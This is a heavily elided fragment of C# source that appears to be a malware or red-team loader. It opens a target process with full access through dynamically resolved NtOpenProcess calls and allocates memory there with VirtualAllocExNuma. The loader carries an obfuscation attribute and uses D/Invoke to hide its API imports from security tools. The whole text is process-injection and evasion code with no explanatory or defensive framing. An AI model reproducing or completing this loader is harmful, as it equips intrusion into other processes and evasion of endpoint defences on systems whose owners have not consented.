...
#pragma warning restore 0618
    ...
    [Obfuscation(Exclude = false, Feature ="-rename,-constants,-ctrl flow,-anti debug,-anti dump,-anti ildasm,-anti tamper")]
    class Program
    {
    ...
    {    
        public static void Run(string[] args){
            ...
            var res = ntOpenProcess(ref hCurrentProcess,
                (uint)ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa2,
                ref ci2);

            var parameters = new object[] { hCurrentProcess, IntPtr.Zero, 
                (uint)0x1000, (uint)0x3000, (uint)0x4, (uint)0 };

            var mem = DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke(@"kernel32.dll", 
                @"VirtualAllocExNuma",
                typeof(VirtualAllocExNuma),ref parameters);
           ...
           res = ntOpenProcess(ref hTargetProcess,
               (uint)ProcessAccessFlags.PROCESS_ALL_ACCESS,
               ref oa,
               ref ci);
	...
	[UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr VirtualAllocExNuma(IntPtr hProcess, 
            IntPtr lpAddress, 
            uint dwSize, 
